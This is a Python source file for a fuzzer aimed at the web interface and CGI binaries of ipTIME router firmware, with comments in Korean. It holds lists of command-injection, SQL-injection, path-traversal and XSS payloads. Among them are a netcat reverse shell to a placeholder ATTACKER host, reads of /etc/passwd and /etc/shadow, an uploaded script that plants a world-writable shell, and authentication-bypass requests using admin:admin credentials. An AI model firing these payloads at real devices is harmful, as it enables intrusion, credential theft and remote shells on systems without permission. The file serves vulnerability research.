"""
ipTIME Firmware Fuzzer - HTTP/CGI Fuzzer
httpd 및 CGI 바이너리 전용 퍼저

타겟: sbin/httpd (72,768 bytes)
관련 CGI:
  - cgibin/login-cgi/login.cgi
  - cgibin/login-cgi/urlredir.cgi
  - home/httpd/cgi/d.cgi
  - home/httpd/cgi/firmware.cgi
  - home/httpd/cgi/service.cgi
  - home/httpd/cgi/ftm.cgi
"""

import random
import socket
import struct  # Added
import urllib.parse
from typing import Dict, List, Optional

from .base import BaseFuzzer


class HTTPFuzzer(BaseFuzzer):
    """
    ipTIME HTTP/CGI 퍼저

    웹 인터페이스는 가장 넓은 공격 표면을 제공하며,
    인증 우회, 명령어 인젝션, 경로 순회 등 다양한 취약점 탐색.
    """

    # 퍼징 대상 CGI 엔드포인트
    ENDPOINTS = [
        "/",
        "/index.html",
        "/cgi/d.cgi",
        "/cgi/firmware.cgi",
        "/cgi/service.cgi",
        "/cgi/ftm.cgi",
        "/login.cgi",
        "/urlredir.cgi",
        "/cgi-bin/login.cgi",
        "/cgi-bin/d.cgi",
    ]

    # 흥미로운 파라미터 이름
    PARAMETERS = [
        "username",
        "password",
        "passwd",
        "user",
        "pass",
        "cmd",
        "command",
        "action",
        "act",
        "do",
        "ip",
        "port",
        "host",
        "addr",
        "mac",
        "ssid",
        "key",
        "psk",
        "file",
        "path",
        "dir",
        "name",
        "url",
        "redirect",
        "next",
        "goto",
        "id",
        "idx",
        "index",
        "num",
        "data",
        "value",
        "config",
        "setting",
    ]

    # HTTP 메소드
    METHODS = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "TRACE", "PATCH"]

    def __init__(self, config: dict):
        super().__init__(config)
        self.name = config.get("name", "HTTPFuzzer")
        self.target_port = config.get("target_port", 80)

        # 인젝션 페이로드
        self.cmd_injection = [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la /",
            "| ls -la",
            "\n/bin/sh -c id",
            "|| id",
            "&& id",
            "; nc -e /bin/sh ATTACKER 4444 #",
        ]

        self.sql_injection = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' UNION SELECT 1,2,3--",
        ]

        self.path_traversal = [
            "../",
            "../../",
            "../../../",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
        ]

        self.xss_payloads = [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            "<img src=x onerror=alert(1)>",
        ]

    def send(self, data: bytes) -> Optional[bytes]:
        """HTTP 요청 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        try:
            sock.connect((self.target_host, self.target_port))
            sock.sendall(data)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            return response if response else None

        except socket.timeout:
            return None
        except Exception as e:
            raise e
        finally:
            sock.close()

    def generate_seed(self) -> bytes:
        """기본 HTTP 요청 시드 생성"""
        seeds = [
            self._make_get_request("/"),
            self._make_get_request("/cgi/d.cgi"),
            self._make_post_request("/login.cgi", "username=admin&password=admin"),
        ]
        return random.choice(seeds)

    def _make_get_request(self, path: str, params: Dict[str, str] = None) -> bytes:
        """GET 요청 생성"""
        if params:
            query = urllib.parse.urlencode(params)
            path = f"{path}?{query}"

        request = f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += "User-Agent: iptime-fuzzer/1.0\r\n"
        request += "Accept: */*\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        return request.encode()

    def _make_post_request(
        self, path: str, body: str, content_type: str = "application/x-www-form-urlencoded"
    ) -> bytes:
        """POST 요청 생성"""
        request = f"POST {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += "User-Agent: iptime-fuzzer/1.0\r\n"
        request += f"Content-Type: {content_type}\r\n"
        request += f"Content-Length: {len(body)}\r\n"
        request += "Accept: */*\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        request += body
        return request.encode()

    def _make_multipart_request(self, path: str, files: Dict[str, bytes]) -> bytes:
        """멀티파트 요청 생성 (파일 업로드)"""
        boundary = f"----FuzzerBoundary{random.randint(100000, 999999)}"

        body = b""
        for name, content in files.items():
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="{name}"; filename="{name}.bin"\r\n'.encode()
            body += b"Content-Type: application/octet-stream\r\n"
            body += b"\r\n"
            body += content
            body += b"\r\n"
        body += f"--{boundary}--\r\n".encode()

        request = f"POST {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += "User-Agent: iptime-fuzzer/1.0\r\n"
        request += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        request += f"Content-Length: {len(body)}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"

        return request.encode() + body

    def mutate(self, data: bytes) -> bytes:
        """HTTP 요청 뮤테이션"""
        strategies = [
            self._mutate_endpoint,
            self._mutate_params_cmd_injection,
            self._mutate_params_sql_injection,
            self._mutate_path_traversal,
            self._mutate_headers,
            self._mutate_method,
            self._mutate_body_overflow,
            self._mutate_multipart,
            self._mutate_auth_bypass,
        ]

        return random.choice(strategies)(data)

    # ========== 뮤테이션 전략들 ==========

    def _mutate_endpoint(self, data: bytes) -> bytes:
        """엔드포인트 변경"""
        endpoint = random.choice(self.ENDPOINTS)
        params = {random.choice(self.PARAMETERS): "test"}
        return self._make_get_request(endpoint, params)

    def _mutate_params_cmd_injection(self, data: bytes) -> bytes:
        """파라미터에 명령어 인젝션"""
        endpoint = random.choice(self.ENDPOINTS)
        param = random.choice(self.PARAMETERS)
        injection = random.choice(self.cmd_injection)

        return self._make_post_request(endpoint, f"{param}={urllib.parse.quote(injection)}")

    def _mutate_params_sql_injection(self, data: bytes) -> bytes:
        """파라미터에 SQL 인젝션"""
        endpoint = random.choice(self.ENDPOINTS)
        param = random.choice(self.PARAMETERS)
        injection = random.choice(self.sql_injection)

        return self._make_post_request(endpoint, f"{param}={urllib.parse.quote(injection)}")

    def _mutate_path_traversal(self, data: bytes) -> bytes:
        """경로 순회 공격"""
        traversal = random.choice(self.path_traversal)
        endpoint = random.choice(self.ENDPOINTS)

        # 경로에 직접 삽입
        path = traversal + endpoint.lstrip("/")
        return self._make_get_request(path)

    def _mutate_headers(self, data: bytes) -> bytes:
        """헤더 퍼징"""
        fuzz_headers = [
            ("Cookie", "A" * random.choice([256, 1024, 4096, 8192])),
            ("Cookie", "session=" + "A" * 1000),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1; cat /etc/passwd"),
            ("Content-Length", str(random.choice([-1, 0, 999999, 0xFFFFFFFF]))),
            ("Host", "A" * 1024),
            ("Host", "127.0.0.1; id"),
            ("User-Agent", "A" * 4096),
            ("Referer", "http://evil.com/" + "A" * 1000),
            ("Authorization", "Basic " + "A" * 1000),
        ]

        header_name, header_value = random.choice(fuzz_headers)
        endpoint = random.choice(self.ENDPOINTS)

        request = f"GET {endpoint} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"{header_name}: {header_value}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        return request.encode()

    def _mutate_method(self, data: bytes) -> bytes:
        """HTTP 메소드 퍼징"""
        method = random.choice(self.METHODS + ["FUZZ", "AAAA", "OPTIONS"])
        endpoint = random.choice(self.ENDPOINTS)

        request = f"{method} {endpoint} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        return request.encode()

    def _mutate_body_overflow(self, data: bytes) -> bytes:
        """바디 오버플로우"""
        endpoint = random.choice(self.ENDPOINTS)
        size = random.choice([256, 1024, 4096, 16384, 65536])
        body = "A" * size
        return self._make_post_request(endpoint, body)

    def _make_firmware_image(self) -> bytes:
        """가짜 펌웨어 이미지 생성 (TRX 헤더 모사)"""
        # TRX Header Structure
        magic = b"HDR0"
        length = struct.pack("<I", 1024 * 1024)  # 1MB
        crc32 = struct.pack("<I", 0xDEADBEEF)
        flags = struct.pack("<H", 0)
        version = struct.pack("<H", 1)

        # Offsets
        offsets = struct.pack("<III", 28, 0, 0)

        header = magic + length + crc32 + flags + version + offsets
        padding = b"\x00" * (28 - len(header))

        payload = b"A" * 1024  # Body (should be compressed data)

        return header + padding + payload

    def _mutate_multipart(self, data: bytes) -> bytes:
        """멀티파트 파일 업로드 퍼징 (스마트)"""
        endpoint = "/cgi/firmware.cgi"

        # 악성 파일 내용
        file_contents = [
            b"A" * 1024,
            self._make_firmware_image(),  # Valid Header
            self._make_firmware_image() + b"A" * 4096,  # Valid Header + Overflow
            b"\x7fELF" + b"\x00" * 100 + b"\x01",  # ELF Header
            b"#!/bin/sh\ncp /bin/sh /tmp/sh; chmod 777 /tmp/sh\n",
        ]

        return self._make_multipart_request(endpoint, {"firmware": random.choice(file_contents)})

    def _mutate_auth_bypass(self, data: bytes) -> bytes:
        """인증 우회 시도"""
        bypass_paths = [
            "/cgi/d.cgi",
            "/cgi/service.cgi?action=get_status",
            "/cgi/d.cgi?act=info",
            "//cgi/d.cgi",
            "/./cgi/d.cgi",
            "/cgi/d.cgi;.js",
            "/cgi/d.cgi%00",
            "/cgi/d.cgi?",
        ]

        bypass_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("Authorization", "Basic YWRtaW46YWRtaW4="),  # admin:admin
        ]

        path = random.choice(bypass_paths)
        header = random.choice(bypass_headers)

        request = f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"{header[0]}: {header[1]}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        return request.encode()

    def is_crash(self, response: Optional[bytes], error: Optional[str]) -> bool:
        """크래시 감지"""
        if error:
            crash_indicators = [
                "Connection refused",
                "Connection reset",
                "Broken pipe",
            ]
            return any(ind in error for ind in crash_indicators)
        return False

    def is_interesting(self, response: Optional[bytes]) -> bool:
        """흥미로운 응답 감지"""
        if response is None:
            return False

        # HTTP 상태 코드 확인
        interesting_status = [b"500 ", b"502 ", b"503 ", b"400 "]

        # 민감한 정보 노출
        sensitive_patterns = [
            b"root:",
            b"/etc/passwd",
            b"/bin/sh",
            b"uid=",
            b"gid=",
            b"segfault",
            b"SIGSEGV",
            b"stack trace",
            b"exception",
            b"fatal error",
            b"mysql",
            b"sqlite",
            b"password",
            b"secret",
            b"admin",
            b"config",
        ]

        response_lower = response.lower()

        # 상태 코드 체크
        if any(status in response for status in interesting_status):
            return True

        # 민감 정보 체크
        if any(pattern in response_lower for pattern in sensitive_patterns):
            return True

        return False
